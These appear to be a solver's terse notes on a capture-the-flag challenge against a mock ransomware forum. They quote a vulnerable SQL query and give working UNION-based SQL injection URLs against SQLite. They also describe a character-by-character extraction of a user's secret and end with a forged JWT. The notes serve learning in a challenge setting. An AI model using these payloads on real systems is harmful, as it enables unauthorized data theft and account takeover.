can access https://gztkmtljeceezgmv.ransommethis.net/jrtwtevqduetiiho/forum

can't access https://gztkmtljeceezgmv.ransommethis.net/jrtwtevqduetiiho/admin

userinfo page has sql injection

```py
infoquery= "SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid WHERE a.userName='%s'" %query
```

all admins: https://gztkmtljeceezgmv.ransommethis.net/jrtwtevqduetiiho/adminlist

target user is AccessibleTinderbox

db engine is sqlite

need to leak the uid and secret column values for that user

https://gztkmtljeceezgmv.ransommethis.net/jrtwtevqduetiiho/userinfo?user=AccessibleTinderbox

https://gztkmtljeceezgmv.ransommethis.net/jrtwtevqduetiiho/userinfo?user=AccessibleTinderbox%27%20union%20select%201,%20uid,%20uid,%20uid%20from%20Accounts%20where%20userName%20=%20%27AccessibleTinderbox%27;%20--

uid is 2187

secret is a string, have to leak it char by char as an int
HEX(SUBSTR(secret, 0, 1))

https://gztkmtljeceezgmv.ransommethis.net/jrtwtevqduetiiho/userinfo?user=AccessibleTinderbox%27%20union%20select%201,%20uid,%20uid,%20HEX(SUBSTR(secret,1,1))%20from%20Accounts%20where%20userName%20=%20%27AccessibleTinderbox%27;%20--

$ python leak_secret.py
failed on 6
failed on 7
failed on 8
failed on 16
failed on 21
failed on 22
failed on 24
failed on 26
aYGiC###c19HyuI#YY7B##5#W#wBe3bH

leaked the failing ones with `instr`

full secret: aYGiCMKZc19HyuImYY7Bll5MWNwBe3bH

final jwt
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjEwODY0NjUsImV4cCI6MTY2MzY3ODQ2NSwidWlkIjoyMTg3LCJzZWMiOiJhWUdpQ01LWmMxOUh5dUltWVk3QmxsNU1XTndCZTNiSCJ9.JGRzyNewMnxabK-iULJ6eLB9WnqOKuduccyBDM8mBIM
```